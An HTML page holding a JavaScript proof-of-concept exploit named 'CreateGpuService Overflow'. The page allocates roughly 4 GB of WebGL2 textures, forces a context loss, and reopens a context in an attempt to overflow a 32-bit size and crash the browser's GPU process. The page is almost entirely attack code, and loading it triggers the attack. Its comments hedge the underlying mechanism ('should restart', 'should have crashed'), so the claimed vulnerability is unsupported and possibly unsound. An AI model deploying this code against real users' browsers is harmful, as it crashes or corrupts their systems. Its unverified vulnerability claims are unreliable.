<!DOCTYPE html>
<html>
<body>
<h1>CreateGpuService Overflow PoC</h1>
<pre id="log"></pre>
<script>
(async function() {
  const log = (msg) => { document.getElementById('log').textContent += msg + '\n'; };

  // Step 1: Create an OffscreenCanvas and WebGL2 context
  const canvas = new OffscreenCanvas(256, 256);
  const gl = canvas.getContext('webgl2', {
    powerPreference: 'high-performance',
    failIfMajorPerformanceCaveat: false
  });
  if (!gl) return log('WebGL2 not supported');

  const maxSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
  // Use 2048x2048 to stay safe while still consuming 16 MB each
  const texWidth = Math.min(2048, maxSize);
  const texHeight = Math.min(2048, maxSize);
  const bytesPerTex = texWidth * texHeight * 4; // RGBA

  log(`Using ${texWidth}x${texHeight} textures (${bytesPerTex} bytes each)`);
  log(`Max possible textures before 32-bit wrap: ${Math.floor(0xFFFFFFFF / bytesPerTex)}`);

  const textures = [];
  let totalBytes = 0;

  // Step 2: Allocate textures until we get close to 32-bit overflow
  // We'll stop a few hundred MB before overflow to avoid an OOM kill
  const targetBytes = 0xFFFFFFFF - 500 * 1024 * 1024; // 500 MB before wrap
  while (totalBytes < targetBytes) {
    const tex = gl.createTexture();
    gl.bindTexture(gl.TEXTURE_2D, tex);
    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, texWidth, texHeight, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
    textures.push(tex);
    totalBytes += bytesPerTex;
    if (textures.length % 100 === 0) log(`Allocated ${textures.length} textures, total ${(totalBytes/1024/1024).toFixed(0)} MB`);
  }
  log(`Paused at ${textures.length} textures, total ${(totalBytes/1024/1024).toFixed(0)} MB`);

  // Step 3: Force a GPU process restart (which will call CreateGpuService with the total)
  // The browser should pass the current total discardable memory size to the new process.
  // We induce a restart by losing the WebGL context.
  const loseExt = gl.getExtension('WEBGL_lose_context');
  if (loseExt) {
    loseExt.loseContext();
    log('Context lost. GPU process should restart soon.');
  }

  // Wait a bit for the restart
  setTimeout(() => {
    log('Attempting to create a new context with a size that overflows...');
    // Step 4: Create a new context. The browser will send CreateGpuService with the total size
    // from the previous context, which is near 0xFFFFFFFF. With the new context, the GPU process
    // will try to allocate a shared memory region, overflow, and crash.
    try {
      const newCanvas = new OffscreenCanvas(1, 1);
      const newGl = newCanvas.getContext('webgl2', {
        powerPreference: 'high-performance',
        failIfMajorPerformanceCaveat: false
      });
      if (newGl) {
        log('New context created. If the overflow occurred, the GPU process should have crashed with SIGSEGV.');
        // Try a small allocation to trigger the overflow (the first allocation after init uses the wrapped size)
        const tex = newGl.createTexture();
        newGl.bindTexture(newGl.TEXTURE_2D, tex);
        newGl.texImage2D(newGl.TEXTURE_2D, 0, newGl.RGBA, 1, 1, 0, newGl.RGBA, newGl.UNSIGNED_BYTE, null);
        log('Texture allocated successfully (unexpected)');
      }
    } catch(e) {
      log('Error creating new context: ' + e.message);
    }
  }, 2000);
})();
</script>
</body>
</html>
